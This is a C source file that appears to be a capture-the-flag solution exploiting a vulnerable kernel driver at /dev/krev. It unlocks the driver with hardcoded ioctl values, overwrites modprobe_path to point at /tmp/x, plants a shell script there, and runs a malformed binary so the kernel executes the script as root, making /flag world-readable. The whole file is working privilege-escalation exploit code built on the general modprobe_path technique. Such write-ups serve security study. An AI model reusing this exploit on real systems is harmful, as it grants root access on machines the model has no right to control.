#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <linux/ioctl.h>

typedef unsigned long long u64;

// define commands
#define IOCTL_BASE 'W'
#define CMD_UNLOCK  _IO(IOCTL_BASE, 0)
#define CMD_WRITE   _IO(IOCTL_BASE, 1)

int fd;

void hex_print(void *addr, size_t len)
{
    u64 tmp_addr = (u64)addr;
    puts("");
    for(u64 tmp_addr=(u64)addr; tmp_addr < (u64)addr + len; tmp_addr += 0x10) {
        printf("0x%016llx: 0x%016llx 0x%016llx\n", tmp_addr, *(u64 *)tmp_addr, *(u64 *)(tmp_addr+8));
    }
}

void unlock()
{
	char input[0x50];
	char *inp1 = input;
	char *inp2 = input+0x10;
	char *inp3 = input+0x20;
	char *inp4 = input+0x30;
	char *inp5 = input+0x40;

	memset(input, 0, sizeof(input));
	strcpy(inp1, "CUHK");


	//int urand_fd = open("/dev/urandom", 0);
	//read(urand_fd, inp2, 0x10);
	//hex_print(inp2, 0x10);
	*(u64*)inp2 = 0x54df0782784ace8a;
	*(u64*)(inp2+8) = 0x45d6bfa0e6df966d;

	// input3
	*(u64*)(inp3) = 0x1b62edbfa;

	// input4
	strcpy(inp4, "SHHO");

	int ret = ioctl(fd, CMD_UNLOCK, input);
	assert(ret == 0);
}


void write_to_modprobe()
{
	char a[] = "/tmp/x";
	int ret = ioctl(fd, CMD_WRITE, a);
	assert(ret == 0);
}

void get_flag()
{
	system("echo '#!/bin/sh\nchmod 666 /flag\n' > /tmp/x; chmod +x /tmp/x");
	system("echo 1 > /tmp/1; chmod +x /tmp/1; /tmp/1 2> /dev/null");
	system("cat /flag");
}

int main()
{
	fd = open("/dev/krev", O_RDWR);
	assert(fd >= 0);
	unlock();

	write_to_modprobe();
	get_flag();
}
